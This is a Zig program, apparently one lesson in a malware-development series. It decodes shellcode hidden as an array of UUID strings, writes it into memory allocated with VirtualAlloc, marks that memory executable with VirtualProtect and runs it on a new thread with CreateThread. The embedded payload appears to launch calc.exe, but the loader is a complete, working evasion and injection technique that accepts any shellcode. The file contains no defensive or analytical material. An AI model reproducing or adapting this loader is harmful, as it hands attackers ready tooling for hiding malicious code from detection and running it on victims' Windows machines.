const std = @import("std");
const win = @import("zigwin32").everything;
const uuidDeobfuscation = @import("12.payload-obfuscation-uuidfuscation.zig").uuidDeobfuscation;

const WINAPI = std.os.windows.WINAPI;
const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;

const VirtualAlloc = win.VirtualAlloc;
const VirtualProtect = win.VirtualProtect;
const CreateThread = win.CreateThread;
const WaitForSingleObject = win.WaitForSingleObject;
const VirtualFree = win.VirtualFree;
const GetLastError = win.GetLastError;
const GetCurrentProcessId = win.GetCurrentProcessId;

const uuid_array = [_][:0]const u8{
    "E48348FC-E8F0-00C0-0000-415141505251",
    "D2314856-4865-528B-6048-8B5218488B52",
    "728B4820-4850-B70F-4A4A-4D31C94831C0",
    "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
    "48514152-528B-8B20-423C-4801D08B8088",
    "48000000-C085-6774-4801-D0508B481844",
    "4920408B-D001-56E3-48FF-C9418B348848",
    "314DD601-48C9-C031-AC41-C1C90D4101C1",
    "F175E038-034C-244C-0845-39D175D85844",
    "4924408B-D001-4166-8B0C-48448B401C49",
    "8B41D001-8804-0148-D041-5841585E595A",
    "59415841-5A41-8348-EC20-4152FFE05841",
    "8B485A59-E912-FF57-FFFF-5D48BA010000",
    "00000000-4800-8D8D-0101-000041BA318B",
    "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",
    "C48348D5-3C28-7C06-0A80-FBE07505BB47",
    "6A6F7213-5900-8941-DAFF-D563616C632E",
    "00657865-0000-0000-0000-000000000000",
};

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    std.debug.print("[i] Injecting Shellcode To The Local Process Of Pid: {d}\n", .{GetCurrentProcessId()});

    std.debug.print("[i] Decrypting ...\n", .{});

    const payload = try uuidDeobfuscation(allocator, &uuid_array);
    defer allocator.free(payload);

    std.debug.print("[+] Done !\n", .{});
    std.debug.print("[i] Deobfuscated Payload At: {*} Of Size: {d}\n", .{ payload, payload.len });

    std.debug.print("[i] Allocating Memory With VirtualAlloc\n", .{});

    const shellcode = VirtualAlloc(null, payload.len, .{ .COMMIT = 1, .RESERVE = 1 }, .{ .PAGE_READWRITE = 1 }) orelse {
        std.debug.print("[!] VirtualAlloc Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualAllocFailed;
    };

    defer _ = VirtualFree(shellcode, 0, .RELEASE);
    std.debug.print("[i] Allocated Memory At: {*}\n", .{shellcode});

    @memcpy(@as([*]u8, @ptrCast(shellcode)), payload);
    @memset(payload, 0);

    std.debug.print("[i] Modifying Memory Protection To EXECUTE_READWRITE ...\n", .{});

    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
    if (VirtualProtect(
        shellcode,
        payload.len,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtect Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectFailed;
    }

    const shellcode_fn: *const fn (lpThreadParameter: ?*anyopaque) callconv(WINAPI) u32 = @ptrCast(shellcode);

    std.debug.print("[i] Creating A New Thread ...\n", .{});

    const h_thread = CreateThread(
        null,
        0,
        shellcode_fn,
        null,
        .{},
        null,
    ) orelse {
        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateThreadFailed;
    };
    _ = WaitForSingleObject(h_thread, 2000);
}
